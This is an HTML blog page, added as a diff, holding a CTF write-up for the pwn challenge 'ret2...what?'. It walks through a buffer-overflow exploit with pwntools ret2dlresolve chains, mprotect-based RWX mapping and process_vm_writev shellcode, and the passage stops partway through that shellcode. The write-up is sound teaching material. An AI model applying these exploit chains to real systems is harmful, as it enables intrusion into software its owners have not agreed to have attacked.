@@ -1,0 +1,764 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BlahajCTF 2025 Finals</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>Nikola's blog</h1>
+    <span>ctf and stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">About</a> /
+    <a id="articles"class="info-link"href="/articles.html">Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        BlahajCTF 2025 Finals
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Writeup for the pwn challenge ret2...what? by @FS in the BlahajCTF 2025 Finals
+        </h2>
+      
+      <time id="article-date">
+        2025.12.14
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><a href="#challenge-protections">Challenge Protections</a><li><a href="#challenge">Challenge</a><li><a href="#attack-strategy">Attack Strategy</a><ul><li><a href="#process_vm_readv-and-process_vm_writev">process_vm_readv and process_vm_writev</a><li><a href="#pivoting-to-write">Pivoting to Write</a><li><a href="#setting-up-ret2dlresolve">Setting up Ret2dlresolve</a><li><a href="#getting-an-rwx-map-on-bss">Getting an RWX map on BSS</a><li><a href="#shellcode-on-the-bss%2C-flag-on-the-mmap">Shellcode on the BSS, Flag on the mmap</a></ul><li><a href="#the-unintended-way">The Unintended Way</a><li><a href="#thoughts-and-conclusions">Thoughts and Conclusions</a></ul></div><p></p>
+</details>
+<p>This weekend, I participated in the BlahajCTF 2025 Finals. There were three pwn challengesin which I only solved one. ‘ret2…what’ by @baaaa_fs7 (FS) was a challenge I came close to solving, but could not within the time limit. After the competition, I went back and finished my solves. In this write-up, I will detail the intended solve, as well as an unintended one.</p>
+<h2 id="challenge-protections"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/blahaj/finals/ret2what/chall_patched'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x3fe000)
+    RUNPATH:    b'.'
+    Stripped:   No
+</code></pre>
+<p>PIE is disabled for this challenge, and there is Partial RELRO meaning GOT entries are writable.</p>
+<h2 id="challenge"tabindex="-1">Challenge</h2>
+<p>The challenge provides us with two binaries: <code>chall</code> and <code>test</code>.</p>
+<p>chall.c:</p>
+<pre class="hljs"><code>
+<span class="hljs-comment">// gcc -o chall chall.c -fno-stack-protector -no-pie -z relro -Wno-implicit-function-declaration -lseccomp</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">cleanUp</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x150</span>] = {<span class="hljs-number">0</span>};
+    <span class="hljs-comment">// oneLastShot</span>
+    fgets(buf, <span class="hljs-number">0x160</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">taunt</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">pid_t</span> pid = fork();
+    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)
+    {
+        execl(<span class="hljs-string">&quot;./test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, (<span class="hljs-type">char</span> *)<span class="hljs-literal">NULL</span>);
+        perror(<span class="hljs-string">&quot;execl failed&quot;</span>);
+    }
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">seccomp_</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">int</span> rc;
+    scmp_filter_ctx ctx;
+    <span class="hljs-type">char</span> *boohoo = <span class="hljs-string">&quot;:(&quot;</span>;
+    <span class="hljs-type">char</span> *stra = <span class="hljs-string">&quot;Load Failed %s\n&quot;</span>;
+    ctx = seccomp_init(SCMP_ACT_ALLOW);
+    <span class="hljs-keyword">if</span> (ctx == <span class="hljs-literal">NULL</span>)
+    {
+        perror(<span class="hljs-string">&quot;seccomp_init&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-type">int</span> blocked_syscalls[] = {
+        SCMP_SYS(pread64),
+        SCMP_SYS(readv),
+        SCMP_SYS(execve),
+        SCMP_SYS(readlink),
+        SCMP_SYS(readahead),
+        SCMP_SYS(readlinkat),
+        SCMP_SYS(preadv),
+        SCMP_SYS(openat),
+        SCMP_SYS(openat2),
+        SCMP_SYS(open),
+        SCMP_SYS(creat),
+        SCMP_SYS(sendfile),
+        SCMP_SYS(fork),
+        SCMP_SYS(execveat),
+        SCMP_SYS(sendfile),
+        SCMP_SYS(preadv2),
+    };
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(blocked_syscalls) / <span class="hljs-keyword">sizeof</span>(blocked_syscalls[<span class="hljs-number">0</span>]); i++)
+    {
+        rc = seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, blocked_syscalls[i], <span class="hljs-number">0</span>);
+        <span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)
+        {
+            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to block syscall %d\n&quot;</span>, blocked_syscalls[i]);
+            seccomp_release(ctx);
+            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+        }
+    }
+    rc = seccomp_load(ctx);
+    <span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)
+    {
+        perror(<span class="hljs-string">&quot;seccomp_load&quot;</span>);
+        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, stra, boohoo);
+        seccomp_release(ctx);
+        cleanUp();
+    }
+
+    seccomp_release(ctx);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];
+    <span class="hljs-type">char</span> s[] = <span class="hljs-string">&quot;Have you heard of &#x27;Don&#x27;t Tap the Glass&#x27;?\n&quot;</span>;
+    <span class="hljs-type">int</span> n = <span class="hljs-number">10</span>;
+    taunt();
+    seccomp_();
+    <span class="hljs-built_in">memset</span>(s, (<span class="hljs-type">short</span>)n, n);
+    fgets(buf, <span class="hljs-number">0x150</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>When the binary is run, the program first forks and runs the <code>test</code> binary. Afterwards, it sets up a seccomp filter that blacklists <code>execve</code> family syscalls, as well as the <code>open</code> family syscalls.</p>
+<p>Finally, the program gives a straightforward buffer overflow to ROP.</p>
+<p>In the seccomp setup function, there is a branch of code that calls <code>fprintf()</code> and then a <code>cleanUp()</code> function that gives us yet another buffer overflow.</p>
+<p>test.c</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    alarm(<span class="hljs-number">0x1a</span>);
+    <span class="hljs-type">size_t</span> size = <span class="hljs-number">4096</span>;
+
+    <span class="hljs-type">void</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, size,
+                     PROT_READ | PROT_WRITE,
+                     MAP_PRIVATE | MAP_ANONYMOUS,
+                     <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
+
+    <span class="hljs-keyword">if</span> (ptr == MAP_FAILED)
+    {
+        perror(<span class="hljs-string">&quot;mmap&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory mapped at %p\n&quot;</span>, ptr);
+    <span class="hljs-type">pid_t</span> pid = getpid();
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PID: %d\n&quot;</span>, pid);
+    *(<span class="hljs-type">char</span> *)ptr = <span class="hljs-number">0x41</span>;
+    <span class="hljs-keyword">while</span> (*(<span class="hljs-type">char</span> *)ptr == <span class="hljs-number">0x41</span>)
+    {
+        usleep(<span class="hljs-number">100000</span>);
+    }
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];
+    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;./flag&quot;</span>, O_RDONLY);
+    read(fd, buf, <span class="hljs-number">0x100</span>);
+    <span class="hljs-built_in">memcpy</span>(ptr, buf, <span class="hljs-number">0x30</span>);
+    sleep(<span class="hljs-number">10</span>);
+}
+</code></pre>
+<p>The <code>test</code> binary <code>mmap()</code>s a writable region where a 0x41 byte is written. While the value of that byte is 0x41, the program goes into a loop with a <code>usleep()</code>. When the value of the byte is not 0x41, the program finally opens the flag file and reads it into the chunk.</p>
+<p>Both the PID and address of the memory region are given to us.</p>
+<p>Hence, the main goal will be to somehow exfiltrate the flag from the child <code>test</code> process without using <code>open()</code> syscalls.</p>
+<h2 id="attack-strategy"tabindex="-1">Attack Strategy</h2>
+<p>I kinda threw at this part because I was fumbling around on what to do, this was quite a novel challenge (and a fun one in the end!). Eventually, I took note of a few things (and some things that FS enlightened me to):</p>
+<ol>
+<li>There is partial RELRO, but no <code>puts()</code> or <code>printf()</code> call, meaning we can’t leak LIBC but we can perform a <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve/">Ret2dlresolve attack</a></li>
+<li>Conveniently, <code>fprintf()</code> takes in 3 arguments, just as <code>mprotect()</code> does! I did not notice this during the CTF, but it was only after FS told me this that I realised my solve path could have been easier. If we could control the pointer in the <code>stderr</code> global variable, as well as the two other arguments (relative to RBP), we can control where to create an <code>rwx</code> region for shellcode.</li>
+</ol>
+<p>My attack path was the following:</p>
+<ol>
+<li>Perform a manual ret2dlresolve attack to replace the <code>fprintf()</code> and <code>seccomp_release()</code> GOT entries with <code>mprotect()</code> and <code>puts()</code> respectively</li>
+<li>Afterwards, jump to the part in <code>seccomp_()</code> that calls our <code>fprintf</code> as <code>mprotect</code> and gives us the buffer overflow to finally write our shellcode.</li>
+<li>Somehow exfiltrate the flag?</li>
+</ol>
+<p>Even with this general solve path, there is still a question to remain - how can we read and write to the child process’ memory without using the <code>open</code> syscall?</p>
+<h3 id="process_vm_readv-and-process_vm_writev"tabindex="-1">process_vm_readv and process_vm_writev</h3>
+<p>In the linux syscall table, there are two syscalls that allow read/write to a process with just its PID:</p>
+<ol>
+<li><code>process_vm_readv</code>, which reads bytes from the process to its callee process</li>
+<li><code>process_vm_writev</code>, which writes bytes from the callee process to the process of choice</li>
+</ol>
+<p>From the man-page, <code>process_vm_readv</code> and <code>process_vm_writev</code> are called as follows:</p>
+<p><code>process_vm_readv</code>:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span>
+
+<span class="hljs-type">int</span>
+<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-type">char</span>          buf1[<span class="hljs-number">10</span>];
+    <span class="hljs-type">char</span>          buf2[<span class="hljs-number">10</span>];
+    <span class="hljs-type">pid_t</span>         pid = <span class="hljs-number">10</span>;    <span class="hljs-comment">/* PID of remote process */</span>
+    <span class="hljs-type">ssize_t</span>       nread;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span>  <span class="hljs-title">local</span>[2];</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span>  <span class="hljs-title">remote</span>[1];</span>
+
+    local[<span class="hljs-number">0</span>].iov_base = buf1;
+    local[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">10</span>;
+    local[<span class="hljs-number">1</span>].iov_base = buf2;
+    local[<span class="hljs-number">1</span>].iov_len = <span class="hljs-number">10</span>;
+    remote[<span class="hljs-number">0</span>].iov_base = (<span class="hljs-type">void</span> *) <span class="hljs-number">0x10000</span>;
+    remote[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">20</span>;
+
+    nread = process_vm_readv(pid, local, <span class="hljs-number">2</span>, remote, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (nread != <span class="hljs-number">20</span>)
+        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
+
+    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);
+}
+</code></pre>
+<p><code>process_vm_writev</code></p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span>
+
+<span class="hljs-type">int</span>
+<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-type">char</span>          buf1[<span class="hljs-number">10</span>];
+    <span class="hljs-type">char</span>          buf2[<span class="hljs-number">10</span>];
+    <span class="hljs-type">pid_t</span>         pid = <span class="hljs-number">10</span>;    <span class="hljs-comment">/* PID of remote process */</span>
+    <span class="hljs-type">ssize_t</span>       nread;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span>  <span class="hljs-title">local</span>[2];</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span>  <span class="hljs-title">remote</span>[1];</span>
+
+    local[<span class="hljs-number">0</span>].iov_base = buf1;
+    local[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">10</span>;
+    local[<span class="hljs-number">1</span>].iov_base = buf2;
+    local[<span class="hljs-number">1</span>].iov_len = <span class="hljs-number">10</span>;
+    remote[<span class="hljs-number">0</span>].iov_base = (<span class="hljs-type">void</span> *) <span class="hljs-number">0x10000</span>;
+    remote[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">20</span>;
+
+    nread = process_vm_writev(pid, local, <span class="hljs-number">2</span>, remote, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (nread != <span class="hljs-number">20</span>)
+        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
+
+    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);
+}
+</code></pre>
+<p>Both take in the PID, an <code>iovec</code> struct consisting of the buffer and its length for the local process and the remote process, as well as the <code>liovcnt</code> that determines the number of bytes written or read, as well as the <code>riovcnt</code> and some flags.</p>
+<p>Hence, we can write shellcode that sets the arguments, creates the <code>iovec</code> structures and calls the syscalls for us to write to and read from the child process’ memory.</p>
+<h3 id="pivoting-to-write"tabindex="-1">Pivoting to Write</h3>
+<p>As there are no more <code>pop rdi</code>, <code>pop rsi</code>, or <code>pop rdx</code> gadgets following the removal of <code>__libc_csu_init</code> in GCC-compiled binaries after GLIBC 2.34, we cannot use our standard ROP chain of utilising pops to set registers and call functions.</p>
+<p>Instead, we will have to perform a more restricted form of ROP, using chains within the pre-existing functions that set the registers for us using offsets from RBP.</p>
+<p>Notice, in <code>main()</code>:</p>
+<pre class="hljs"><code>   0x000000000040149c &lt;+169&gt;:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 &lt;stdin@GLIBC_2.2.5&gt;
+   0x00000000004014a3 &lt;+176&gt;:	lea    rax,[rbp-0x110]
+   0x00000000004014aa &lt;+183&gt;:	mov    esi,0x150
+   0x00000000004014af &lt;+188&gt;:	mov    rdi,rax
+   0x00000000004014b2 &lt;+191&gt;:	call   0x401080 &lt;fgets@plt&gt;
+   0x00000000004014b7 &lt;+196&gt;:	mov    eax,0x0
+   0x00000000004014bc &lt;+201&gt;:	leave
+   0x00000000004014bd &lt;+202&gt;:	ret
+</code></pre>
+<p>As <code>rdi</code> is set by an offset of <code>rbp</code>, we can actually achieve an <strong>arbitrary write</strong> by controlling <code>rbp</code>.</p>
+<p>When <code>leave; ret</code> executes, the following actually occurs:</p>
+<pre class="hljs"><code>mov rsp, rbp
+pop rbp
+</code></pre>
+<p>Hence, the value of <code>rbp</code> is modified to the value it was <strong>pointing</strong> to initially. This gives us a way to control the value of <code>rbp</code> by modifiying its saved value.</p>
+<p>We can also use the default <code>__do_global_dtors_aux</code> gadget:</p>
+<pre class="hljs"><code>   0x4011ad &lt;__do_global_dtors_aux+29&gt;:	pop    rbp
+   0x4011ae &lt;__do_global_dtors_aux+30&gt;:	ret
+</code></pre>
+<p>to set <code>rbp</code> in between ROP chains.</p>
+<p>However, the risk of jumping back into the user-defined functions is that we pivot <code>rsp</code> as well, due to the <code>leave; ret</code> instructions at the end. Hence, each pivot of <code>rbp</code> must consequentially be able to control the return address <code>rbp+8</code> to maintain execution flow.</p>
+<h3 id="setting-up-ret2dlresolve"tabindex="-1">Setting up Ret2dlresolve</h3>
+<p>With this in mind, we can use our “arbitrary write” ROP to forge the structures for Ret2dlresolve. We first initialise our structure payloads with pwntool’s utilities:</p>
+<pre class="hljs"><code>dlresolve1 = Ret2dlresolvePayload(elf, symbol=<span class="hljs-string">&#x27;mprotect&#x27;</span>, args=[], data_addr=data_addr1+<span class="hljs-number">0x30</span>)
+
+elf64_rel = dlresolve1.payload[-<span class="hljs-number">24</span>:]
+elf64_rel = p64(elf.got.fprintf) + elf64_rel[<span class="hljs-number">8</span>:]
+resolve_payload1 = dlresolve1.payload[:-<span class="hljs-number">24</span>] + elf64_rel
+
+dlresolve2 = Ret2dlresolvePayload(elf, symbol=<span class="hljs-string">&#x27;puts&#x27;</span>, args=[], data_addr=data_addr2+<span class="hljs-number">0x30</span>)
+elf64_rel = dlresolve2.payload[-<span class="hljs-number">24</span>:]
+elf64_rel = p64(elf.got.seccomp_release) + elf64_rel[<span class="hljs-number">8</span>:]
+resolve_payload2 = dlresolve2.payload[:-<span class="hljs-number">24</span>] + elf64_rel
+</code></pre>
+<p>We will modify the default payloads to replace the GOT entries of <code>fprintf</code> and <code>seccomp_release</code> (so we don’t segfault after our <code>fprintf</code> in <code>seccomp_()</code>) upon linking via <code>dlresolve</code>, as well as the <code>data_addr</code> that will point to the location of our <code>resolve_payload</code>s. Now, we can use our buffer overflow to write our first dlresolve payload:</p>
+<pre class="hljs"><code>rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x118</span>)
+rop1.rbp = data_addr1+<span class="hljs-number">0x110</span>
+rop1.raw(<span class="hljs-number">0x000000000040149c</span>)
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+
+rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+rop1.raw(rop.chain())
+rop1.rbp = data_addr2+<span class="hljs-number">0x110</span>
+rop1.raw(<span class="hljs-number">0x40149c</span>)
+rop1.raw(resolve_payload1)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x118</span>-<span class="hljs-built_in">len</span>(rop1.chain())))
+rop1.rbp = data_addr1
+rop1.raw(<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;leave; ret&#x27;</span>))))
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+</code></pre>
+<p>First, we set <code>rbp</code> to be our “where” address to write to, but with an added 0x110 to account for the RBP offset in <code>0x40149c</code>. This is so we can jump here:</p>
+<pre class="hljs"><code>   0x000000000040149c &lt;+169&gt;:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 &lt;stdin@GLIBC_2.2.5&gt;
+   0x00000000004014a3 &lt;+176&gt;:	lea    rax,[rbp-0x110]
+   0x00000000004014aa &lt;+183&gt;:	mov    esi,0x150
+   0x00000000004014af &lt;+188&gt;:	mov    rdi,rax
+   0x00000000004014b2 &lt;+191&gt;:	call   0x401080 &lt;fgets@plt&gt;
+</code></pre>
+<p>Giving us a write to our target address. After our write, we will want to ret2dlresolve with the standard pwntools ROP chain for doing as such so we can successfully link <code>mprotect</code> to our chosen <code>fprintf</code> GOT entry. Hence, we pivot to the beginning of our buffer where the ret2dlresolve chain lies. Afterwards, we will want to set-up the write for our second <code>resolve_payload</code>.</p>
+<p>Hence, using <code>pop rbp; ret</code>, we set <code>rbp</code> to point to the second target address with the added offset. Then we do the same thing again:</p>
+<pre class="hljs"><code>rop = ROP(elf)
+rop.ret2dlresolve(dlresolve2)
+
+rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+rop1.raw(rop.chain())
+rop1.rbp = <span class="hljs-number">0x4040a0</span>+<span class="hljs-number">0x110</span>
+rop1.raw(<span class="hljs-number">0x40149c</span>)
+rop1.raw(resolve_payload2)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x118</span>-<span class="hljs-built_in">len</span>(rop1.chain())))
+rop1.rbp = data_addr2
+rop1.raw(<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;leave; ret&#x27;</span>))))
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+</code></pre>
+<h3 id="getting-an-rwx-map-on-bss"tabindex="-1">Getting an RWX map on BSS</h3>
+<p>Now that we have successfully replaced <code>fprintf</code> and <code>seccomp_release</code> with <code>mprotect</code> and <code>puts</code> respectively, we can finally jump to this part of <code>seccomp_</code> to get our RWX region and eventually write our shellcode:</p>
+<pre class="hljs"><code>   0x00000000004013af &lt;+350&gt;:	mov    rax,QWORD PTR [rip+0x2cea]        # 0x4040a0 &lt;stderr@GLIBC_2.2.5&gt;
+   0x00000000004013b6 &lt;+357&gt;:	mov    rdx,QWORD PTR [rbp-0x10]
+   0x00000000004013ba &lt;+361&gt;:	mov    rcx,QWORD PTR [rbp-0x18]
+   0x00000000004013be &lt;+365&gt;:	mov    rsi,rcx
+   0x00000000004013c1 &lt;+368&gt;:	mov    rdi,rax
+   0x00000000004013c4 &lt;+371&gt;:	mov    eax,0x0
+   0x00000000004013c9 &lt;+376&gt;:	call   0x401090 &lt;fprintf@plt&gt;
+   0x00000000004013ce &lt;+381&gt;:	mov    rax,QWORD PTR [rbp-0x20]
+   0x00000000004013d2 &lt;+385&gt;:	mov    rdi,rax
+   0x00000000004013d5 &lt;+388&gt;:	call   0x401060 &lt;seccomp_release@plt&gt;
+   0x00000000004013da &lt;+393&gt;:	mov    eax,0x0
+   0x00000000004013df &lt;+398&gt;:	call   0x4011c6 &lt;cleanUp&gt;
+   0x00000000004013e4 &lt;+403&gt;:	mov    rax,QWORD PTR [rbp-0x20]
+   0x00000000004013e8 &lt;+407&gt;:	mov    rdi,rax
+   0x00000000004013eb &lt;+410&gt;:	call   0x401060 &lt;seccomp_release@plt&gt;
+   0x00000000004013f0 &lt;+415&gt;:	nop
+   0x00000000004013f1 &lt;+416&gt;:	leave
+   0x00000000004013f2 &lt;+417&gt;:	ret
+</code></pre>
+<p>Notice that the first argument of <code>fprintf()</code> is the <code>stderr</code> global variable, with the second and third arguments being offsets of <code>rbp</code>. As we want the <code>mprotect</code> call to map the BSS region to be RWX, we will need to perform a third arbitrary write to modify the value of <code>stderr</code> from the actual <code>_IO_2_1_stderr_</code> to the address of the BSS:</p>
+<pre class="hljs"><code>rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+rop1.raw(rop.chain())
+rop1.rbp = <span class="hljs-number">0x4040a0</span>+<span class="hljs-number">0x110</span> <span class="hljs-comment"># We pivot back </span>
+rop1.raw(<span class="hljs-number">0x40149c</span>)
+rop1.raw(resolve_payload2)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x118</span>-<span class="hljs-built_in">len</span>(rop1.chain())))
+rop1.rbp = data_addr2
+rop1.raw(<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;leave; ret&#x27;</span>))))
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+
+rop1 = flat({
+    <span class="hljs-number">0x0</span>: <span class="hljs-number">0x404000</span>,
+    <span class="hljs-number">0x110</span>: [<span class="hljs-number">0x404f00</span>, <span class="hljs-number">0x40149c</span>]
+})
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1)
+
+</code></pre>
+<p>Now, we pivot to a bogus address and jump back to the write chain in <code>main()</code> to set our second and third arguments for <code>mprotect</code>.</p>
+<p>Recall that the second and third arguments of <code>fprintf</code> are determined by offsets of <code>rbp</code>:</p>
+<pre class="hljs"><code>   0x00000000004013b6 &lt;+357&gt;:	mov    rdx,QWORD PTR [rbp-0x10]
+   0x00000000004013ba &lt;+361&gt;:	mov    rcx,QWORD PTR [rbp-0x18]
+   0x00000000004013be &lt;+365&gt;:	mov    rsi,rcx
+   0x00000000004013c1 &lt;+368&gt;:	mov    rdi,rax
+   0x00000000004013c4 &lt;+371&gt;:	mov    eax,0x0
+   0x00000000004013c9 &lt;+376&gt;:	call   0x401090 &lt;fprintf@plt&gt;
+</code></pre>
+<p>Hence, we set the arguments accordingly with our write before we jump back to <code>seccomp_</code>:</p>
+<pre class="hljs"><code>rop1 = flat({
+    <span class="hljs-number">0x110</span>-<span class="hljs-number">0x20</span>: [<span class="hljs-number">0x404000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x7</span>],
+    <span class="hljs-number">0x110</span>: [<span class="hljs-number">0x404f00</span>, <span class="hljs-number">0x4013af</span>]
+})
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1)
+</code></pre>
+<p>After the <code>mprotect</code> call, our BSS region is now executable and writable!</p>
+<p><img src="/images/2025-12-14-10-48-19.png"alt="executable"loading="lazy"decoding="async"width="1845"height="790"></p>
+<p>This puts us in position to write our shellcode on the BSS with the <code>cleanUp()</code> function:</p>
+<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">cleanUp</span><span class="hljs-params">()</span>
+{
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x150</span>] = {<span class="hljs-number">0</span>};
+    <span class="hljs-comment">// oneLastShot</span>
+    fgets(buf, <span class="hljs-number">0x160</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-keyword">return</span>;
+}
+</code></pre>
+<h3 id="shellcode-on-the-bss%2C-flag-on-the-mmap"tabindex="-1">Shellcode on the BSS, Flag on the mmap</h3>
+<p>Let’s write some shellcode :D however I am horrible at shellcode so I will not explain much, the idea is basically to set the <code>iovec</code> arguments to point to some random part of the BSS, and then set them by incrementing the registers by 8 and modifying them in place. We also perform a <code>usleep</code> syscall after writing our byte to the memory region on the child process so it has time to open and read the flag onto the buffer.</p>
+<pre class="hljs"><code>sc = asm(<span class="hljs-string">f&#x27;&#x27;&#x27;
+mov rax, 0x137 /* process_vm_writev
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rcx, rsi
+add rcx, 8
+mov qword ptr [rcx], 0x1 
+add rcx, 8
+mov qword ptr [rcx], 0x61
+
+mov rdx, 1             
+
